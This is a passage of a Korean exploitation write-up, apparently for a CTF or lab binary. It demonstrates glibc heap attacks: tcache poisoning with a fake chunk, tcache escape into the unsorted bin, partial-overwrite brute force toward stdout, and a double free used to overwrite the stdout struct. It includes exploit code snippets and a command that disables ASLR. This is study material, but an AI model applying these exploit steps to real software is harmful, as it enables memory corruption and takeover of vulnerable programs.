url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyUlEQVQY04XN0W6EIBCFYZ+jKpAFmRFFBUZFZS80oU3f/4WabrxtN/nvJt+ZIp5jevbpe53zHFLoXedXQ5uh3WDfMolc/VlRfsV6tFXyZSZBlwArGhANiuY/duMqr9z2LFGdF+5PoS1X8JbduM6RDV2VQvlJ3J9MDeyB7HV7+7z4mAYBg7Rk/CGnrMOBPoyErdU+6gdCLbFWd7+jEl5pLqGIhMs0XDFdYduvvZ0XnJNySRlHYFbsHHRWGwtm1C30jlMS4eBuk2b8AWAVOjAt2/WtAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png\"\n        srcset=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/e9ff0/6.png 180w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/f21e7/6.png 360w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png 720w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/914ae/6.png 860w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD를 Fake Chunk의 주소 값으로 조작하여 첫 번째 tcache가 Fake chunk의 주소 값을 가리키는 것을 확인할 수 있다.</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 582px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoklEQVQoz33SW3LbNhQG4CyksWTrEkmxnciyTV0si5IpixRBiiAAEiBIkOBF98ROm5esoJPOdCmd6RI7GjdtlIcs4Jtz/vOfV49K3+j0hu3+ZGLeDO6BRw3HNSAeTmdnrYvT1nm7f3epdM9vlAul22h3TitvarVmqdooVRuv5iYkv66iPz7T3z+BTcxWS5KnUCZOHLVHw+pVG8kkWK3YquDrNYhYudk6qbz5F0MUZH9+ef7r68e/v5Lf1nFcxOmShWkQyvaVcto859u1fH6ST/vs+Ylui7OLi5Ozbxi4no2o7uCxDibETT59iPbbYLti66IzUavKDY4ET4tAZlG+sjApVeov8oB1C1rQMy00mc4Hqoa4gDQAiBgL97JzW663TAe7HoceQzQ0LKf0becDNh1iuZ5hQU23VM1gQpJAYBYin7/rKOX6W5dyP0z8MKZC2sgr1xr/Y8wiFklEQ9PB07mdb/dyuck2u3yzv+7dlWstnuTpei9Xm3zzwQ/FETYhcQizXF8zrPuHWRCnL0OYkO+vlZNKA9EwiHMmJE9y6NEjPNUtAzhT3RzPzP7owaUcEoYod/3g6rZfa13OLAdAAiC2sa8Z4CgzuFPtO3WqanOHqDMDceF4AaSh7bHRVO8Nx331YTDSusNxdzjuKINy9bvJiAs/SrksHELBo7XLtokfhZhzyHo3/dfVhsiWcrllkfR5ssD0rN46qfxX1cIF0FtgOjXtSFs8hcWGiCWKdkjoyuiXatMhzOMxYaHHYwDxUWbdcgE8tPVgAHX8yHlMWRQEImDi6rpbqjWB67n+4QSYhfOFe4RtRB18eIC57Y4e5zwtfCFZkrEke3/bK9dbhAue5EGchmnx47UxEzSUQZxZrqcZ1kvP6XqXrXfXvcHPe/4H6gX+guCc2pUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6_1.png\"\n        title=\"./6_1.png\"\n        src=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png\"\n        srcset=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/e9ff0/6_1.png 180w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/f21e7/6_1.png 360w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png 582w\"\n        sizes=\"(max-width: 582px) 100vw, 582px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>포인터 배열 6번째 인덱스에 Fake chunk가 할당된 모습을 확인할 수 있다.</li>\n<li>해제를 세 번 한 이유는 <code class=\"language-text\">tcache->counts</code> 가 underflow 되는 것을 막기 위해서이다.</li>\n<li>free시 tcache→counts++</li>\n<li>malloc시 tcache→counts—</li>\n<li>만약 할당 과정에서 두 개의 tcache를 사용하게 된다면 다음 할당 과정에서 음수 처리가 되지 않기 때문에  255 변환되어 underflow되어 tcache를 사용하지 않는다.</li>\n<li>tcache는 7개 bin만을 관리하기 때문이다.</li>\n</ul>\n<h2 id=\"free-fake-chunk\" style=\"position:relative;\"><a href=\"#free-fake-chunk\" aria-label=\"free fake chunk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Free Fake chunk</h2>\n<ul>\n<li><code class=\"language-text\">0xd0</code> 크기 또한 tcache에서 관리하기 때문에 unsorted bin이 되지 못한다.</li>\n<li>해당 청크를 8번 해제하면 마지막 해제할 때 unsorted bin이 되어 tcache escape가 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">escape</span> <span class=\"token expression\">tcache</span></span>\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">unsorted</span> <span class=\"token expression\">bin <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> escape <span class=\"token function\">tcache</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrUlEQVQoz4XS626iQByGca9jKw7KaYBBQQsUKqUKWlxOIjCACB7aZu//DjamaZu1WU2er7+8yX+moy1kwxo+RA/yXFf0sSjDiS5MdB7JsEdDcLXOnasTCP1y1e6TSQqPgGbBLfONCUfvIdR1NcI2ScH8wj3q3A3cfdZ6IrqbqcTUJIUpYAXA8oCBAwj7HCRoCCjuuwtMQo5lJU0wVNGmtLmg2cbT+P6eMkyaF5gBBUlOBFACEAEOkRfYd3V3NvUDN8O/X3CysBwLjRzDWFqWrZkTKNJDFagWOXnsK/qA4f/BUYzjtJotg03VZuXuJVzTSAnSIq3bKC8ZcUT0GTD46PKWnTAt4qx8Xnh41xbNfhUmUFLivKwPr3jbQCQTFAcY/hzN/8AbHG0K2/Vw3ZbNYRUlHFKirDjjXcshmRj89/E6YYqjtJgtVrhud8f3BFefy29lc4CScg0HSR5usO16+bap2qO/TjlJidJiuz/huoXS1eUoK+O8mi39sj3uTu9xiuFwnBTb9u3Pdn+6sbxarIJgbdjOMoiDJHM8nxFGc8/316kXrllx2PvxN77wX2mEmoOMdcSpAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/4888cd178a7732d198d147e63ff153e5/37523/7.png\"\n        srcset=\"/static/4888cd178a7732d198d147e63ff153e5/e9ff0/7.png 180w,\n/static/4888cd178a7732d198d147e63ff153e5/f21e7/7.png 360w,\n/static/4888cd178a7732d198d147e63ff153e5/37523/7.png 720w,\n/static/4888cd178a7732d198d147e63ff153e5/59822/7.png 916w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">0x555555757260</code> Fake Chunk 부분을 8번 해제하여 마지막 한 부분이 unsortedbin 값에 대입된다.</li>\n<li>unsorted bin으로 넘어가는 부분에서 FD, BK 위치에 main_arena 주소가 담겨 있는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"point-to-stdout\" style=\"position:relative;\"><a href=\"#point-to-stdout\" aria-label=\"point to stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>point to stdout</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 572px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqUlEQVQoz03Qa2+iQBQG4P6KTRovRQvVbuyuxoLOKDDAAMNFLgPDcJFAY9Pb/v/vjWl33a/nnCfvm3NlQc1HFkHYPaQ6JgfKWNVSXlNey3A/nEhLBei2Zzgecjxkk/liOb6d3YjzG3F+ZXiHiFUBLdwwBZoZZzykhRNEThDvEB4Iomq5RdMnrIxZFdFipcDhRBKk+zO2gyTjdZgwP6Y6JvzY8bbLqqbuTiSMr8dT5Ph1/5xXx7xuq7ZXdtoFkyjjTUd5E2Wlcb47nd7+HJ+em/7kBtH1eGqSsH/9eHp571/eT28fClQH/7DphhEtwpTZ/rlnwkp+7M4l8xJhdyBIe8NmdcfqNq/bsu1ksL8kI9sPk5wECSYHoJlhmlPexDmnvEHY/TEUoI7ToklZFbMqKxsFqheMZWA/bl2o6djzokw1nUegAs2AyIKatVLgUgZb1ZSBulWNzV4X7x8u3zZlYK43IcKbnQ51vDdsDRPTDUwSBEmO/QjqlobJ7/VmtljNFssv9o23DyuwWGrrjfTz10AQR9O70fRuOJGGE2kgiH8n0uh29rX6H38CClWFRviwlkEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png\"\n        srcset=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/e9ff0/8.png 180w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/f21e7/8.png 360w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png 572w\"\n        sizes=\"(max-width: 572px) 100vw, 572px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>stdout 주소와 main_arena 영역의 주소는 가까우며 1.5byte brute-force를 통해 main_arena의 주소를 stdout 주소로 조작해야 한다.</li>\n<li>ASLR을 끈 후에 익스프로잇을 작성하자</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">sysctl <span class=\"token operator\">-</span>w kernel<span class=\"token punctuation\">.</span>randomize_va_space<span class=\"token operator\">=</span><span class=\"token number\">0</span></code></pre></div>\n<ul>\n<li>미리 할당한 청크를 Double Free해 unsorted bin 청크 위에 새로 할당하고 하위 바이트를 덮어써 stdout 주소로 조작 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">point</span> <span class=\"token expression\">to main_arena address of unsorted bin</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">stdout</span> <span class=\"token expression\">brute force</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\\x07\\xdd\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVUlEQVQoz43Q226CQBCAYV7DpCzKssssuOBC8ICCBypYj4itpbZarU37/m/QYONFE9ua/Jm7L5kZSQQ1J3B57DPHAc7MGmMWKxNQtP+TSqFXcq3S0JdNX1ZBroCsXiULLHc95Nk3SRPxNiIG0kAhRUj7kXyaCtbPUQWDhI0qBcHNDlSbthCOYLalV6uAMWgaUA3wKaqBShhiVhm4onPEamVqSEnIOm17ktSDpGF6EbiJ7bTiYRJFsWC8QQ1xyiSgEqMwUHhkiAJnWTZLl4uH1eZwCOOJ3QiW+cs0W+tcKBpgwlTCMGHKxbVnq3w0y+JJmr/s+/HIbbY3r8fscUNNW1apcr758sPS9dN4nk3S+93x4/Zu6raC7dtHvt0DF9/4tyrUkNL7fLxYjebL3fvncDwTdf95/75+3rFr8KDTC7tRuz/0e5Hnh5bbCAZxKxxgMBHW/8Zf6f5tmHFRerAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/77760310dd7914b3f7438543febc9f5a/37523/9.png\"\n        srcset=\"/static/77760310dd7914b3f7438543febc9f5a/e9ff0/9.png 180w,\n/static/77760310dd7914b3f7438543febc9f5a/f21e7/9.png 360w,\n/static/77760310dd7914b3f7438543febc9f5a/37523/9.png 720w,\n/static/77760310dd7914b3f7438543febc9f5a/302a4/9.png 1080w,\n/static/77760310dd7914b3f7438543febc9f5a/dc61a/9.png 1147w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Double Free Bug를 바탕으로 같은 주소를 가리키게 한 다음 해당 크기 만큼 동적할 당하여 FD 값을 <code class=\"language-text\">\\x70</code> 바이트로 변조하여 Fake Chunk를 가리키게 한다.</li>\n<li>다음 할당은 버리고 Fake Chunk에 값을 써 하위 3바이트 부분을 stdout 주소로 변조한다.</li>\n<li>그럼이제 stdout을 조작할 준비가 끝났다.</li>\n</ul>\n<h2 id=\"overwrite-stdout-struct\" style=\"position:relative;\"><a href=\"#overwrite-stdout-struct\" aria-label=\"overwrite stdout struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overwrite Stdout Struct</h2>\n<ul>\n<li>Double Free Bug를 통해 조작한 stdout 주소가 존재하는 위치에 힙 청크를 할당 한다.</li>\n<li>할당하게 되면 FD가 stdout 주소가 되기 때문에 다음 할당 시 stdout 구조체에 할당이 되어 해당 구조체에 값을 쓸 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABDElEQVQY032Ny27CMBRE8xstwU78im/8CLEJdiCBJulTYkclyqb//xkVbUHqokhHs5ozk3SD7fuq22+WY3Druqykj6UL4AIQIRGVmP1LMnsJyKjZ4NMhkGqX8SIX8ocb2q+cPgakdTqu5kOL9RazArPz4e3Pi/wU51rdTcvZFJHepUSmBBADzGTG/1TRJdFVvjeWCMuqFdgttVNZN8ZbWxG9ENqLlBZzWiAmMybJeQ7ybzIGmEOydmC17uu49bFpbKh942Nlg5OmlyaAiVK1ogwCgElJhSLcEq4Iz8Emp6N5GM3+YA5HFd8b3L7R7pN2H265OeyG0/T8GjarQjWFMhyo8ahusWvxIhBRfgF/OEaudvk0pQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f210e0c184e41d303510650668f2cd66/37523/10.png\"\n        srcset=\"/static/f210e0c184e41d303510650668f2cd66/e9ff0/10.png 180w,\n/static/f210e0c184e41d303510650668f2cd66/f21e7/10.png 360w,\n/static/f210e0c184e41d303510650668f2cd66/37523/10.png 720w,\n/static/f210e0c184e41d303510650668f2cd66/35751/10.png 873w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>이제 stdout 구조체를 영역을 할당하여 값을 조작하도록 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 513px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAADEElEQVQ4y22S2Y7bOBBF/RsznbZkWwupfV+ohRI3UWvb3TCmkf//kIHsIEg6AeqBL4f31EUdWBrxyKmAledx0RQ1rusOlThHjKZ1r8JIAaFq+irwFQ1oOtR1cNEAMKChw4MTZKghSV5DL8lqgjDPKqJq9sV0zqalaOZJB4oGVM1UNKDoUDUs1bCOOjxq4HDUAR0WPm1ifqt73hAxv997Idf3/1o6pGXb8SkpGj5umE11z6uWpGXjBunr2TicDLtnE2aSyrUhIipqsVzFsl3vn8v1nlVtL2bUko6NYr7WHad8LOo+Re3xYu4wHRa53ui4snGNi5rIhc3ruN1u9+9ZhTGVLR2aXizXe9MLNsx7Nw05GfCgGlbPRyL2cIRpghqx3Ni0vn18ztd7lCEi5qIhLR34tCFMqZiKuk/2ZOOgGjaXG5Mrn94qTGvCh/XWcbl9fNY9L1uyf9qScX3HbOz5VNSdE6YadBUN7HDHxl2MDJjJp3aQFmfT/jGGdTbtC3BOj8fJsBQNHi97+fvOTK7j9jHMVzFfi7bPm04DzouqfTvpP+f1bBw1cLyYT+w5+874kRykRT/MCNMwq8IM2UESpCX04yApvTjfPX/BfsI2lYuYtgS1cr1ZXmQ6oeXHGnRNJ9CgC70IeNEFOF/IH8lVx8iwVJilqE0R9pLcT8swR2GO/KRQLubr2fgz9rmz1bGJjqtc35uek3HBbADunqlb7jPw+OCPf9HW952pXKqOZzX